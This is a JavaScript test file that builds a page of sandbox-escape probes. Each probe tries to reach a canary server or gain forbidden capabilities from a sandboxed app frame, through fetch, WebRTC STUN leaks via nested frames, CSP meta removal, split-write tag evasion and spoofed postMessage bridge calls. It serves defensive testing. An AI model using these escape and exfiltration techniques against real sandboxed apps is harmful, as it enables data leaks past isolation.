// The escape routes, as one page of attacks. The same page runs twice:
//
//   1. inside the real sandbox, as an app with no permissions: every attack must fail (the canary must see nothing);
//   2. on a control page with no sandbox and no policy: every attack that a browser can observe must reach the canary. That proves
//      each attack really works when nothing stops it, so "the sandbox saw nothing" cannot be the result of a broken probe.
//
// A probe is { name, kind, last?, control?, controlExpect?, code }:
//   kind 'net'    reaches out; the canary names the probe in its hit list (/probe/<name>), or a harness event shows it (popup, download, dialog)
//   kind 'cap'    asks for something an opaque origin must not have; the code returns 'allowed' or 'blocked'
//   kind 'works'  something an app is meant to be able to do; the sandbox must still allow it (so a sandbox that blocks everything fails)
//   last: true    the probe wrecks or navigates its own document, so it runs after the others (and alone on the control page)
//   control       the browsers in which the control page must reach the canary (an attack a browser ignores anyway is left out)
//   controlExpect what a cap probe returns on the control page, where that is meaningful
export const BROWSERS = ['chromium', 'firefox', 'webkit'];
const ALL = BROWSERS;

const net = (name, code, extra = {}) => ({ name, kind: 'net', control: ALL, code, ...extra });
// a WebRTC attack: the canary has a UDP port of its own for it. Chromium and Firefox send STUN packets on the control page; the WebKit
// that Playwright runs has no WebRTC at all, so nothing can be observed there (real Safari has it)
const rtc = (name, code, extra = {}) => net(name, code, { udp: true, control: ['chromium', 'firefox'], ...extra });
const cap = (name, code, extra = {}) => ({ name, kind: 'cap', code, ...extra });

const guard = (expr) => `try { ${expr}; return 'allowed'; } catch (e) { return 'blocked'; }`;
// each CSS probe styles its own element: a later rule on a shared one would win the cascade, and the browser would never fetch the losing image
const cssProbe = (name, rule) => net(`css-${name}`, `css('${rule.replaceAll('.x', `.x-${name}`).replaceAll('URL', `' + u('css-${name}') + '`)}'); html('<div class="x-${name}">x</div>');`);

export const PROBES = [
  // ---- the network, by every route we know -----------------------------------------------------------------------------
  net('fetch', `fetch(u('fetch')).catch(() => {});`),
  net('fetch-nocors', `fetch(u('fetch-nocors'), { mode: 'no-cors' }).catch(() => {});`),
  net('fetch-keepalive', `fetch(u('fetch-keepalive'), { method: 'POST', body: 'x', keepalive: true }).catch(() => {});`),
  net('xhr', `const x = new XMLHttpRequest(); x.open('GET', u('xhr')); x.send();`),
  net('beacon', `navigator.sendBeacon(u('beacon'), 'x');`),
  net('websocket', `new WebSocket(u('websocket').replace('http', 'ws'));`),
  net('eventsource', `new EventSource(u('eventsource'));`),
  net('image', `new Image().src = u('image');`),
  net('image-in-dom', `html('<img src="' + u('image-in-dom') + '">');`),
  net('image-srcset', `html('<img srcset="' + u('image-srcset') + ' 1x">');`),
  net('svg-image', `html('<svg width="10" height="10"><image href="' + u('svg-image') + '" width="10" height="10"/></svg>');`),
  net('body-background', `document.body.setAttribute('background', u('body-background'));`),
  cssProbe('background', '.x{background:url(URL)}'),
  cssProbe('list-style', '.x{display:list-item;list-style-image:url(URL)}'),
  cssProbe('border-image', '.x{border:10px solid;border-image:url(URL) 10}'),
  cssProbe('content', '.x::before{content:url(URL)}'),
  cssProbe('mask', '.x{width:20px;height:20px;background:red;-webkit-mask-image:url(URL);mask-image:url(URL)}'),
  cssProbe('image-set', ".x{background-image:image-set(url(URL) 1x)}"),
  cssProbe('font', "@font-face{font-family:probe;src:url(URL)} .x{font-family:probe}"),
  net('css-import', `css('@import url(' + u('css-import') + ');');`),
  net('link-stylesheet', `const l = document.createElement('link'); l.rel = 'stylesheet'; l.href = u('link-stylesheet'); document.head.appendChild(l);`),
  net('link-prefetch', `const l = document.createElement('link'); l.rel = 'prefetch'; l.href = u('link-prefetch'); document.head.appendChild(l);`, { control: ['chromium'] }),
  net('link-preload', `const l = document.createElement('link'); l.rel = 'preload'; l.as = 'image'; l.href = u('link-preload'); document.head.appendChild(l);`),
  net('link-preconnect', `const l = document.createElement('link'); l.rel = 'preconnect'; l.href = C; document.head.appendChild(l);`, { control: [] }),
  net('script-src', `const s = document.createElement('script'); s.src = u('script-src') + '.js'; document.head.appendChild(s);`),
  net('dynamic-import', `import(u('dynamic-import') + '.js').catch(() => {});`),
  net('worker-blob', `new Worker(URL.createObjectURL(new Blob(['fetch("' + u('worker-blob') + '").catch(() => {});'], { type: 'text/javascript' })));`),
  net('worker-importscripts', `new Worker(URL.createObjectURL(new Blob(['try { importScripts("' + u('worker-importscripts') + '.js"); } catch (e) {}'], { type: 'text/javascript' })));`),
  net('worker-remote', `new Worker(u('worker-remote') + '.js');`, { control: [] }),
  net('iframe-src', `const f = document.createElement('iframe'); f.src = u('iframe-src'); document.body.appendChild(f);`),
  net('iframe-srcdoc', `const f = document.createElement('iframe'); f.srcdoc = '<script>fetch("' + u('iframe-srcdoc') + '").catch(() => {});<\\/script><img src="' + u('iframe-srcdoc') + '">'; document.body.appendChild(f);`),
  net('iframe-blob', `const f = document.createElement('iframe'); f.src = URL.createObjectURL(new Blob(['<script>fetch("' + u('iframe-blob') + '").catch(() => {});<\\/script>'], { type: 'text/html' })); document.body.appendChild(f);`),
  net('iframe-data', `const f = document.createElement('iframe'); f.src = 'data:text/html,' + encodeURIComponent('<script>fetch("' + u('iframe-data') + '").catch(() => {});<\\/script>'); document.body.appendChild(f);`),
  net('iframe-about-blank', `const f = document.createElement('iframe'); document.body.appendChild(f); f.contentWindow.fetch(u('iframe-about-blank')).catch(() => {}); f.contentDocument.write('<img src="' + u('iframe-about-blank') + '">');`),
  net('object-data', `html('<object data="' + u('object-data') + '" type="image/gif"></object>');`),
  net('embed-src', `html('<embed src="' + u('embed-src') + '" type="image/gif">');`),
  net('audio', `const a = new Audio(); a.preload = 'auto'; a.src = u('audio'); a.load();`),
  net('video', `html('<video preload="auto" src="' + u('video') + '"></video>');`),
  net('form-post', `html('' + IFR + ' name="sink"></iframe><form id="fp" method="post" action="' + u('form-post') + '" target="sink"><input name="a" value="1"></form>'); document.getElementById('fp').submit();`),

  // ---- WebRTC: no content-security-policy covers it, so the sandbox page takes the constructor away (js/sandbox.js) and nested frames
  // are what could bring a fresh copy back. Each route has its own UDP port on the canary, so a leak says which route it was.
  rtc('webrtc', `await rtcLeak('webrtc', RTCPeerConnection);`),
  rtc('webrtc-prefixed', `await rtcLeak('webrtc-prefixed', window.webkitRTCPeerConnection);`, { control: ['chromium'] }),
  rtc('webrtc-worker', `const w = new Worker(URL.createObjectURL(new Blob(['try { var pc = new RTCPeerConnection(' + JSON.stringify(stun('webrtc-worker')) + '); pc.createDataChannel("x"); pc.createOffer().then(function (o) { return pc.setLocalDescription(o); }); } catch (e) {}'], { type: 'text/javascript' }))); await wait(1500); w.terminate();`, { control: [] }),
  rtc('webrtc-nested-srcdoc', `const f = document.createElement('iframe'); f.srcdoc = rtcSrc('webrtc-nested-srcdoc'); document.body.appendChild(f); await wait(1500);`),
  rtc('webrtc-nested-blob', `const f = document.createElement('iframe'); f.src = URL.createObjectURL(new Blob([rtcSrc('webrtc-nested-blob')], { type: 'text/html' })); document.body.appendChild(f); await wait(1500);`),
  rtc('webrtc-nested-data', `const f = document.createElement('iframe'); f.src = 'data:text/html,' + encodeURIComponent(rtcSrc('webrtc-nested-data')); document.body.appendChild(f); await wait(1500);`),
  rtc('webrtc-nested-innerhtml', `const d = document.createElement('div'); d.innerHTML = '' + IFR + ' srcdoc="' + attr(rtcSrc('webrtc-nested-innerhtml')) + '"></iframe>'; document.body.appendChild(d); await wait(1500);`),
  rtc('webrtc-nested-shadow', `const d = document.createElement('div'); document.body.appendChild(d); const f = document.createElement('iframe'); f.srcdoc = rtcSrc('webrtc-nested-shadow'); d.attachShadow({ mode: 'open' }).appendChild(f); await wait(1500);`),
  rtc('webrtc-nested-object', `html('<object data="data:text/html,' + encodeURIComponent(rtcSrc('webrtc-nested-object')) + '" type="text/html"></object>'); await wait(1500);`),
  rtc('webrtc-nested-setattribute', `const f = document.createElement('iframe'); f.setAttribute('srcdoc', rtcSrc('webrtc-nested-setattribute')); document.body.appendChild(f); await wait(1500);`),
  rtc('webrtc-nested-attrnode', `const a = document.createAttribute('srcdoc'); a.value = rtcSrc('webrtc-nested-attrnode'); const f = document.createElement('iframe'); f.setAttributeNode(a); document.body.appendChild(f); await wait(1500);`),
  rtc('webrtc-nested-javascript-url', `const f = document.createElement('iframe'); document.body.appendChild(f); f.src = 'javascript:' + encodeURIComponent(rtcJs('webrtc-nested-javascript-url')); await wait(1500);`),
  rtc('webrtc-nested-domparser', `const x = new DOMParser().parseFromString('' + IFR + ' xmlns="http://www.w3.org/1999/xhtml" srcdoc="' + attr(rtcSrc('webrtc-nested-domparser')) + '"/>', 'application/xhtml+xml'); document.body.appendChild(document.adoptNode(x.documentElement)); await wait(1500);`, { control: [] }), // an element parsed as XML does not load as a frame even with nothing in the way, so this cannot be observed
  rtc('webrtc-nested-fragment', `document.body.appendChild(document.createRange().createContextualFragment('' + IFR + ' srcdoc="' + attr(rtcSrc('webrtc-nested-fragment')) + '"></iframe>')); await wait(1500);`),
  rtc('webrtc-nested-sethtmlunsafe', `const d = document.createElement('div'); d.setHTMLUnsafe('' + IFR + ' srcdoc="' + attr(rtcSrc('webrtc-nested-sethtmlunsafe')) + '"></iframe>'); document.body.appendChild(d); await wait(1500);`),
  rtc('webrtc-nested-template', `const t = document.createElement('template'); t.innerHTML = '' + IFR + ' srcdoc="' + attr(rtcSrc('webrtc-nested-template')) + '"></iframe>'; document.body.appendChild(t.content.cloneNode(true)); await wait(1500);`),
  rtc('webrtc-nested-svg', `html('<svg><foreignObject>' + IFR + ' srcdoc="' + attr(rtcSrc('webrtc-nested-svg')) + '"></iframe></foreignObject></svg>'); await wait(1500);`),
  rtc('webrtc-restore', `
    // look for any other way to reach the constructor that the page took away
    const found = [];
    for (const holder of [window, Object.getPrototypeOf(window), EventTarget.prototype, Object.prototype]) {
      for (const key of Object.getOwnPropertyNames(holder)) { if (/RTCPeerConnection/i.test(key)) { try { if (typeof holder[key] === 'function') found.push(holder[key]); } catch (e) {} } }
    }
    const d = Object.getOwnPropertyDescriptor(window, 'RTCPeerConnection');
    if (d && typeof d.value === 'function') found.push(d.value);
    if (!found.length) return 'nothing to restore';
    await rtcLeak('webrtc-restore', found[0]);`, { control: ['chromium'] }),
  // these run while the page is still being parsed, before the body exists: a nested frame made then, or a document rewritten then
  rtc('webrtc-early-write', `document.write('' + IFR + ' srcdoc="' + attr(rtcSrc('webrtc-early-write')) + '"></iframe>');`, { early: true }),
  rtc('webrtc-early-open', `document.open(); document.write('' + IFR + ' srcdoc="' + attr(rtcSrc('webrtc-early-open')) + '"></iframe>'); document.close();`, { early: true }),
  // a tag written in two pieces: each piece alone is harmless text, so a check of what is written would see nothing wrong
  rtc('webrtc-early-split-write', `document.write('<ifr'); document.write('ame srcdoc="' + attr(rtcSrc('webrtc-early-split-write')) + '"></iframe>');`, { early: true }),
  rtc('webrtc-early-data', `document.write('' + IFR + ' src="data:text/html,' + encodeURIComponent(rtcSrc('webrtc-early-data')) + '"></iframe>');`, { early: true }),

  // ---- the site's own origin: the host page's policy allows 'self', so only the app's own policy stops these -------------------------
  net('site-fetch', `fetch(s('site-fetch')).catch(() => {});`, { origin: 'site' }),
  net('site-xhr', `const x = new XMLHttpRequest(); x.open('GET', s('site-xhr')); x.send();`, { origin: 'site' }),
  net('site-beacon', `navigator.sendBeacon(s('site-beacon'), 'x');`, { origin: 'site' }),
  net('site-image', `new Image().src = s('site-image');`, { origin: 'site' }),
  net('site-script', `const e = document.createElement('script'); e.src = s('site-script') + '.js'; document.head.appendChild(e);`, { origin: 'site' }),
  net('site-css', `const l = document.createElement('link'); l.rel = 'stylesheet'; l.href = s('site-css') + '.css'; document.head.appendChild(l);`, { origin: 'site' }),
  net('site-iframe', `const f = document.createElement('iframe'); f.src = s('site-iframe'); document.body.appendChild(f);`, { origin: 'site' }),
  net('site-worker', `new Worker(s('site-worker') + '.js');`, { origin: 'site' }),
  net('site-websocket', `new WebSocket(s('site-websocket').replace('http', 'ws'));`, { origin: 'site' }),

  // ---- windows, dialogs and downloads (the test watches the browser for these) ------------------------------------------
  net('popup', `return window.open(u('popup')) ? 'allowed' : 'blocked';`, { harness: 'popup' }),
  net('popup-form', `html('<form id="pf" method="post" action="' + u('popup-form') + '" target="_blank"><input name="a"></form>'); document.getElementById('pf').submit();`, { harness: 'popup' }),
  net('popup-anchor', `const a = document.createElement('a'); a.href = u('popup-anchor'); a.target = '_blank'; document.body.appendChild(a); a.click();`, { harness: 'popup' }),
  net('cookie-plant', `try { document.cookie = 'planted=1; path=/'; } catch (e) {}`, { harness: 'cookie', control: [] }),
  net('download', `const a = document.createElement('a'); a.href = URL.createObjectURL(new Blob(['x'])); a.download = 'x.txt'; document.body.appendChild(a); a.click();`, { harness: 'download', control: [] }),
  net('alert', `alert('x');`, { harness: 'dialog', control: [] }),

  // ---- things an opaque origin must not have --------------------------------------------------------------------------------
  cap('cap-localstorage', guard(`localStorage.getItem('x')`), { controlExpect: 'allowed' }),
  cap('cap-sessionstorage', guard(`sessionStorage.getItem('x')`), { controlExpect: 'allowed' }),
  // WebKit lets a sandboxed frame read document.cookie without throwing, so what matters is whether it can see the host page's cookie
  cap('cap-cookie', `try { return document.cookie.includes('hostcookie=1') ? 'allowed' : 'blocked'; } catch (e) { return 'blocked'; }`, { controlExpect: 'allowed' }),
  cap('cap-indexeddb', `return await new Promise((res) => { try { const r = indexedDB.open('x'); r.onsuccess = () => res('allowed'); r.onerror = () => res('blocked'); } catch (e) { res('blocked'); } });`, { controlExpect: 'allowed' }),
  cap('cap-caches', `try { await caches.open('x'); return 'allowed'; } catch (e) { return 'blocked'; }`, { controlExpect: 'allowed' }),
  cap('cap-serviceworker', `try { await navigator.serviceWorker.register(URL.createObjectURL(new Blob(['1'], { type: 'text/javascript' }))); return 'allowed'; } catch (e) { return 'blocked'; }`),
  cap('cap-parent-document', guard(`parent.document.title`), { controlExpect: 'allowed' }),
  cap('cap-parent-storage', guard(`parent.localStorage.getItem('x')`), { controlExpect: 'allowed' }),
  cap('cap-top-location', guard(`top.location.href.length`), { controlExpect: 'allowed' }),
  cap('cap-parent-eval', guard(`parent.eval('1')`), { controlExpect: 'allowed' }),
  cap('cap-clipboard', `try { await navigator.clipboard.writeText('x'); return 'allowed'; } catch (e) { return 'blocked'; }`),
  cap('cap-fullscreen', `try { await document.documentElement.requestFullscreen(); return 'allowed'; } catch (e) { return 'blocked'; }`),
  // the postMessage bridge: an app with no permissions gets nothing from it
  cap('cap-bridge-storage', `try { await appverse.storage.get('k'); return 'allowed'; } catch (e) { return 'blocked'; }`, { appOnly: true }),
  cap('cap-bridge-clipboard', `try { await appverse.copyText('x'); return 'allowed'; } catch (e) { return 'blocked'; }`, { appOnly: true }),
  cap('cap-bridge-fullscreen', `try { await appverse.requestFullscreen(); return 'allowed'; } catch (e) { return 'blocked'; }`, { appOnly: true }),
  cap('cap-bridge-spoof', `
    // raw messages that skip the appverse object: every real call type without its permission, and names that exist on any object
    const replies = [];
    addEventListener('message', (e) => { if (e.source === parent && e.data && e.data.applet === 1) replies.push(e.data); });
    const types = ['storageGet', 'storageSet', 'storageRemove', 'copy', 'fullscreen', 'constructor', '__proto__', 'toString', 'hasOwnProperty', 'valueOf'];
    types.forEach((type, i) => parent.postMessage({ applet: 1, id: 9000 + i, type, key: 'k', value: 'v', text: 't' }, '*'));
    await new Promise((r) => setTimeout(r, 600));
    return replies.some((r) => 'result' in r) ? 'allowed' : 'blocked';`, { appOnly: true }),

  // ---- what an app is meant to be able to do: the sandbox must not be "everything blocked" --------------------------------
  { name: 'works-data-image', kind: 'works', code: `return await new Promise((res) => { const i = new Image(); i.onload = () => res('allowed'); i.onerror = () => res('blocked'); i.src = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7'; });` },
  { name: 'works-inline-style', kind: 'works', code: `html('<div id="ws" style="width:37px;height:1px"></div>'); return document.getElementById('ws').offsetWidth === 37 ? 'allowed' : 'blocked';` },
  { name: 'works-blob-worker', kind: 'works', code: `return await new Promise((res) => { const w = new Worker(URL.createObjectURL(new Blob(['postMessage(1+1)'], { type: 'text/javascript' }))); w.onmessage = (e) => res(e.data === 2 ? 'allowed' : 'blocked'); w.onerror = () => res('blocked'); });` },

  // ---- attacks that wreck or navigate their own document: last, and one at a time on the control page ----------------------
  net('csp-meta-removed', `document.querySelectorAll('meta[http-equiv]').forEach((m) => m.remove()); fetch(u('csp-meta-removed')).catch(() => {}); new Image().src = u('csp-meta-removed');`, { last: true }),
  net('document-rewrite', `document.open(); document.write('<img src="' + u('document-rewrite') + '"><script>fetch("' + u('document-rewrite') + '").catch(() => {});<\\/script>'); document.close();`, { last: true }),
  net('base-href', `const b = document.createElement('base'); b.href = C + '/'; document.head.appendChild(b); new Image().src = 'probe/base-href';`, { last: true }),
  net('meta-refresh', `document.head.insertAdjacentHTML('beforeend', '<meta http-equiv="refresh" content="0;url=' + u('meta-refresh') + '">');`, { last: true }),
  net('anchor-ping', `const a = document.createElement('a'); a.href = 'about:blank'; a.ping = u('anchor-ping'); document.body.appendChild(a); a.click();`, { last: true, control: ['chromium', 'webkit'] }),
  net('self-navigation', `location.href = u('self-navigation');`, { last: true }),
  net('self-navigation-replace', `location.replace(u('self-navigation-replace'));`, { last: true }),
  net('anchor-self', `const a = document.createElement('a'); a.href = u('anchor-self'); document.body.appendChild(a); a.click();`, { last: true }),
  net('top-navigation', `top.location.href = u('top-navigation');`, { last: true }),
  net('top-open', `window.open(u('top-open'), '_top');`, { last: true }),
  net('parent-navigation', `parent.location.replace(u('parent-navigation'));`, { last: true }),
];

const ids = PROBES.map((p) => p.name);
if (new Set(ids).size !== ids.length) throw new Error('two probes share a name');

/** The names of the probes that have a UDP port of their own on the canary. */
export const UDP_PROBES = PROBES.filter((p) => p.udp).map((p) => p.name);

/**
 * The page that runs the probes. `only` runs one probe, `group: 'main'` all but the last ones, and neither runs everything with the last
 * ones last. The same can be given as a query (`?only=name`) on the control page; inside an app there is no query, so it is baked in.
 * `early` probes run at once, while the page is still being parsed; the others wait for the page to load.
 */
export function probePage({ canary, udpPorts = {}, udpHost = '127.0.0.1', site, only = null, group = null }) {
  const body = PROBES.map((p) => `${JSON.stringify(p.name)}: async () => { ${p.code} }`).join(',\n');
  return `<!doctype html>
<html><head><meta charset="utf-8"><title>probes</title>
<script>
const C = ${JSON.stringify(canary)};
const UDPS = ${JSON.stringify(udpPorts)};
const UDPHOST = ${JSON.stringify(udpHost)};
const SITE = ${JSON.stringify(site)} ?? location.origin; // an app is told the site's address; the control page is the site
const CONFIG = ${JSON.stringify({ only, group })};
const s = (n) => SITE + '/probe/' + n;
const u = (n) => C + '/probe/' + n;
const report = (name, result, detail) => parent.postMessage({ escape: 1, name, result, detail: String(detail ?? '').slice(0, 160) }, '*');
const html = (markup) => document.body.insertAdjacentHTML('beforeend', markup);
const css = (text) => { const s = document.createElement('style'); s.textContent = text; document.head.appendChild(s); };
const wait = (ms) => new Promise((r) => setTimeout(r, ms));
const attr = (text) => text.replace(/"/g, '&quot;');
// WebRTC helpers: a STUN server on the canary's UDP port for this probe, and the script a nested frame or worker would run
const OPEN = '<scr' + 'ipt>', CLOSE = '</scr' + 'ipt>';
// the sandbox refuses a page with a frame written into it, so the tag is spelled out at run time, the way an attacker would
const IFR = '<' + 'iframe';
const stun = (name) => ({ iceServers: [{ urls: 'stun:' + UDPHOST + ':' + UDPS[name] }] });
const rtcJs = (name) => 'try{var P=window.RTCPeerConnection||window.webkitRTCPeerConnection;var pc=new P(' + JSON.stringify(stun(name)) + ');pc.createDataChannel("x");pc.createOffer().then(function(o){return pc.setLocalDescription(o)})}catch(e){}';
const rtcSrc = (name) => OPEN + rtcJs(name) + CLOSE;
const rtcLeak = async (name, Ctor) => { const pc = new Ctor(stun(name)); pc.createDataChannel('x'); await pc.setLocalDescription(await pc.createOffer()); await wait(1500); pc.close(); };
const PROBES = {
${body}
};
const EARLY = ${JSON.stringify(PROBES.filter((p) => p.early).map((p) => p.name))};
const LAST = ${JSON.stringify(PROBES.filter((p) => p.last).map((p) => p.name))};
const MAIN = ${JSON.stringify(PROBES.filter((p) => !p.last && !p.early).map((p) => p.name))};
async function run(name) {
  report(name, 'started');
  try {
    const result = await Promise.race([PROBES[name](), wait(4000).then(() => 'timeout')]);
    report(name, result ?? 'ran');
  } catch (e) { report(name, 'error', (e && e.name) + ': ' + (e && e.message)); }
}
report('__ran', 'ran');
const q = new URLSearchParams(location.search);
const only = CONFIG.only ?? q.get('only');
const group = CONFIG.group ?? q.get('group');
// the early probes start now, at parse time; everything else waits until the page is loaded
const early = (only ? EARLY.filter((n) => n === only) : EARLY).map((n) => run(n));
(async () => {
  if (document.readyState === 'loading') await new Promise((r) => addEventListener('DOMContentLoaded', r));
  await Promise.all(early);
  if (only) { if (!EARLY.includes(only)) await run(only); await wait(1200); report('__done', 'done'); return; }
  for (const n of MAIN) await run(n);
  await wait(1200);
  if (group === 'main') { report('__done', 'done'); return; }
  for (const n of LAST) { await run(n); await wait(150); }
  await wait(1200);
  report('__done', 'done');
})();
</script></head>
<body><div id="t">probes</div></body></html>`;
}
